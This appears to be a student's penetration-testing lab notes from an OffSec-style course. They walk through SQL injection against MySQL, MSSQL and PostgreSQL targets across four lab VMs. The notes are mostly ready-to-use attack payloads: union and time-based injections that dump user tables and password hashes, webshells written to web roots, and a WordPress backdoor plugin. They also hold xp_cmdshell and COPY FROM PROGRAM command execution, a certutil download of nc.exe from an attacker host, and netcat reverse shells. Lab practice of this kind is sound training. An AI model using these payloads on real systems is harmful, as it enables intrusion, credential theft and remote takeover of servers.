SQL injection attacks
```
mysql -u root -p'root' -h 192.168.206.16 -P 3306
select version();
select system_user();
show databases;
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
```

mssql
```
impacket-mssqlclient Administrator:Lab123@192.168.206.18 -windows-auth
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM offsec.information_schema.tables;
select * from offsec.dbo.users;
select * from master.dbo.sysusers;
```

identify SQLi with error based payloads
```
offsec' OR 1=1 -- //
SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
```

test username with `offsec'
then test above, then test
```
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
```

union payloads
```
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```

need to discover the correct number of columns
```
' ORDER BY 5-- //
```

%' gets all the items
```
%' UNION SELECT database(), user(), @@version, null, null -- //
```

shift by 1 to also get the db name, as first col is reserved
```
' UNION SELECT null, null, database(), user(), @@version  -- //
```

get colums from information_schema and store results in second, third and fourth columns leaving the rest null
```
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

found users table with 4 columns
```
' UNION SELECT null, username, password, description, null FROM users -- //
```

blind sql injections - bool and time, can't see output returned from database
```
http://192.168.206.16/blindsqli.php?user=offsec' AND 1=1 -- //
offsec' AND IF (1=1, sleep(3),'false') -- //
```

# Manual code execution
```
impacket-mssqlclient Administrator:Lab123@192.168.206.18 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

automate sql injection
`sqlmap -u http://192.168.206.19/blindsqli.php?user=1 -p user

^ can identify a time based injection vulnerability, next step is to dump users
`sqlmap -u http://192.168.206.19/blindsqli.php?user=1 -p user --dump

### VM1
```
nmap 192.168.206.47
nmap -sT -A 192.168.206.47
nmap --script http-headers 192.168.206.47
gobuster dir -u http://192.168.206.47:80 -w /usr/share/wordlists/dirb/big.txt -p pattern
sudo nmap -p80 --script=http-enum 192.168.206.47
```

discover that the site is wordpress
```
whatweb alvida-eatery.org
wpscan --url http://alvida-eatery.org --enumerate p
```

Find vulnerability in plugins
- use this vuln: https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad
- example hashes: https://hashcat.net/wiki/doku.php?id=example_hashes
curl http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users 

found hash
```
$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0
hashcat -D 1 -d 1 -m 400 -a 0 -S 10.2-hash /usr/share/wordlists/rockyou.txt
```

upload plugin to wordpress
-  add to php backdoor or shell script
```
<?php
/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/

zip backdoor-plugin simple-backdoor-plugin.php
https://alvida-eatery.org/wp-admin/plugins.php?cplugin=php-backdoor-plugin&cmd=ls
https://alvida-eatery.org/wp-admin/plugins.php?cplugin=rev-shell
```

### VM 2
```
nmap 192.168.206.48
nmap -sT -A 192.168.206.48
nmap --script http-headers 192.168.206.48
gobuster dir -u http://192.168.206.48:80 -w /usr/share/wordlists/dirb/big.txt -p pattern
sudo nmap -p80 --script=http-enum 192.168.206.48
whatweb 192.168.206.48
```

Increment until it errors when col does not exist
```
' ORDER BY 5-- //
' ORDER BY 6-- //
' ORDER BY 7-- //
' ORDER BY 8-- //
' ORDER BY 9-- //
' ORDER BY 10-- //
```

there are 6 cols - find the vulnerable one
```
%' UNION SELECT null, null, null, @@version, database(), user()  -- //
' union select null, null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

we find that 5th column is vulnerable
``' union select null, null, table_name, column_name, column_name, null from information_schema.columns where table_schema=database() -- //

``' UNION SELECT null, null, null, null, "<?php system($_GET['cmd']);?>", null INTO OUTFILE "/var/www/html/webshell.php" -- //

access script and inject reverse shell
```
http://192.168.206.48/webshell.php?cmd=ls
nc 192.168.45.194 4444 -e /bin/bash
```

### VM 3 - postgres db
```
nmap 192.168.206.49
nmap -sT -A 192.168.206.49
```

wordlists: https://www.kali.org/tools/wordlists/
```
gobuster dir -u http://192.168.206.49:80 -w /usr/share/wordlists/dirb/common.txt -p pattern
whatweb 192.168.206.49
```

http://192.168.206.49/class.php

test for sqli - expect to see an error output
```
1'
test@test.com'
test@test.com' OR 1=1 -- //
```

determine num cols on height
```
1' ORDER BY 1-- //
1' ORDER BY 2-- //
1' ORDER BY 3-- //
1' ORDER BY 4-- //
1' ORDER BY 5-- //
1' ORDER BY 6-- //
1' ORDER BY 7-- //
1' ORDER BY 8-- //
1' ORDER BY 9-- //
```

7 is beyond, so we have 6 cols
now determine vulnerable column
```
1' UNION SELECT null,cast(version() as int),null,null,null,null --
1' UNION SELECT null,cast(current_database() as int),null,null,null,null --
1' UNION SELECT null,cast(user as int),null,null,null,null --
```

database - glovedb
user - rubben
version - PostgreSQL 13.7 (Debian 13.7-0+deb11u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 10.2.1-6) 10.2.1 20210110, 64-bit

does not seem to work
```
' UNION SELECT null, "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/webshell.php" --
```

look up exploit on exploit db for db version
https://www.exploit-db.com/exploits/50847
https://github.com/b4keSn4ke/CVE-2019-9193

script does not work as we don't have the password so inject the sql directly
`python3 postgrexploit.py -i 192.168.206.49 -p 5432 -d glovedb -c ifconfig`

regular commands don't get output at all, so we need to create a reverse shell
```
1'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'nc 192.168.45.194 4444 -e /bin/bash'; SELECT * FROM cmd_exec; --
```

### VM 4 - windows box
```
nmap 192.168.197.50
gobuster dir -u http://192.168.197.50:80 -w /usr/share/wordlists/dirb/common.txt -p pattern
whatweb 192.168.197.50
```

test for sqli
```
test'
test' OR 1=1 -- //
```

determine num cols on height
```
1' ORDER BY 1-- //
1' ORDER BY 2-- //
1' ORDER BY 3-- //
1' ORDER BY 4-- //
1' ORDER BY 5-- //
1' ORDER BY 6-- //
1' ORDER BY 7-- //
```

find that it errors at 3 so there are 2 cols
```
test' UNION SELECT null, fake  --
test' UNION SELECT CURRENT_USER, NULL  --
test' UNION SELECT "<?php system($_GET['cmd']);?>", null INTO OUTFILE "/Inetpub/wwwroot/webshell.php" -- //
```

none of the above works because only errors are getting output
also this is MSSQL - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-blind-based
https://medium.com/@vikramroot/exploiting-time-based-sql-injections-data-exfiltration-791aa7f0ae87
```
test' AND IF(SUBSTRING(version(),1,1)=5,SLEEP(10),null) # mysql version
test';waitfor delay '0:0:10'--
test';IF(SUBSTRING(DB_NAME(),1,1)='w') WAITFOR DELAY '0:0:5'--
test';IF(SUBSTRING(@@version,1,1)='M') WAITFOR DELAY '0:0:5'--
```

Microsoft SQL Server 2019
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-command-execution

must activate xp_cmdshell first
```
test';EXECUTE sp_configure 'show advanced options', 1;RECONFIGURE;EXECUTE sp_configure 'xp_cmdshell', 1;RECONFIGURE;--
```

then test ping because it's blind
```
test';EXEC xp_cmdshell "ping 192.168.45.219"; --
```

then download the shell
```
test';EXEC xp_cmdshell "certutil.exe -urlcache -f http://192.168.45.194/nc.exe C:/Inetpub/wwwroot/nc.exe"; --
```

Then use the shell to get reverse shell
```
test';EXEC xp_cmdshell "C:/Inetpub/wwwroot/nc.exe -nv 192.168.45.194 4444 -e cmd.exe"; --

sudo tcpdump -i tun0 proto \\icmp
```

### windows web root C:/Inetpub/wwwroot
### search recursively: 

```
dir /s flag.txt
```



